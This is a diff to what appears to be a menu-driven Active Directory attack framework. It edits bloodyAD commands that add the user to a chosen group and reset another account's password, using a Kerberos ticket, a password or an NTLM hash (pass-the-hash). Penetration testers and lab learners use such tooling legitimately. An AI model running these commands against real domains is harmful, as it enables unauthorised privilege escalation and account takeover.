@@ -4801,10 +4801,15 @@ while True:
       AD1 = input("[?] Please enter new group name: ")
       SKEW = timeSync(SKEW)
       if PAS[:2] != "''":
-         localCOM("bloodyAD --host " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + "  -p " + PAS.rstrip(" ") + " add groupMember '" + AD1.rstrip(" ") + "' " + USR.rstrip(""))
+         try:
+            print("[i] Using -k value as password credential...")
+            localCOM("bloodyAD --host " + SDM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + "  -k add groupMember '" + AD1.rstrip(" ") + "' " + USR.rstrip(""))
+         except:
+            print("[i] Using password credential...")         
+            localCOM("bloodyAD --host " + SDM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + "  -p " + PAS.rstrip(" ") + " add groupMember '" + AD1.rstrip(" ") + "' " + USR.rstrip(""))
       else:
           print("[i] Using HASH value as password credential...")    
-          localCOM("bloodyAD --host " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + "  -p :" + NTM.rstrip(" ") + " add groupMember '" + AD1.rstrip(" ") + "' " + USR.rstrip(""))     
+          localCOM("bloodyAD --host " + SDM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + "  -p :" + NTM.rstrip(" ") + " add groupMember '" + AD1.rstrip(" ") + "' " + USR.rstrip(""))     
       prompt() 
 
 # ------------------------------------------------------------------------------------- 
@@ -4821,10 +4826,15 @@ while True:
       AD2 = input("[?] Please enter new users password: ")
       SKEW = timeSync(SKEW)
       if PAS[:2] != "''":
-         localCOM("bloodyAD --host " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " " + AD1.rstrip(" ") + " " + AD2.rstrip(""))
+         try:
+            print("[i] Using -k value as password credential...")
+            localCOM("bloodyAD --host " + SDM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -k " + AD1.rstrip(" ") + " " + AD2.rstrip(""))            
+         except:
+            print("[i] Using password credential...")
+            localCOM("bloodyAD --host " + SDM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " " + AD1.rstrip(" ") + " " + AD2.rstrip(""))
       else:
          print("[i] Using HASH value as password credential...")    
-         localCOM("bloodyAD --host " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + "-p :" + NTM.rstrip(" ") + " " + AD1.rstrip(" ") + " " + AD2.rstrip(""))      
+         localCOM("bloodyAD --host " + SDM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + "-p :" + NTM.rstrip(" ") + " " + AD1.rstrip(" ") + " " + AD2.rstrip(""))      
       prompt() 
 
 # ------------------------------------------------------------------------------------- 
@@ -4929,7 +4939,7 @@ while True:
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
 # Details : Menu option selected - 
-# Old : Menu option selected - Bloody-AD PATCH MSA
+# Old : Menu option selected - Bloody-AD PATCH MSA ADD MSA CRACKER HERE
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
